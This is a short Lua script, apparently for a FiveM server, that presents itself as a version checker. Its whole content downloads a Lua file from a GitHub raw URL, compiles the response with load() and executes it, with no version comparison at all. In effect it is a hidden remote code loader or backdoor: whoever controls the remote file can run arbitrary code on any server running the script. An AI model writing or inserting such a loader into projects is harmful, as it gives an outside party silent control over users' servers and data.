local url = "https://raw.githubusercontent.com/blamefilo/filo_versions/main/version_checker.lua"
PerformHttpRequest(url, function(statusCode, body, headers)
    if statusCode == 200 then
        local func, loadErr = load(body)

        if func then
            local ok, result = pcall(func)

            if ok then
                result()
            end
        end
    end
end, 'GET')
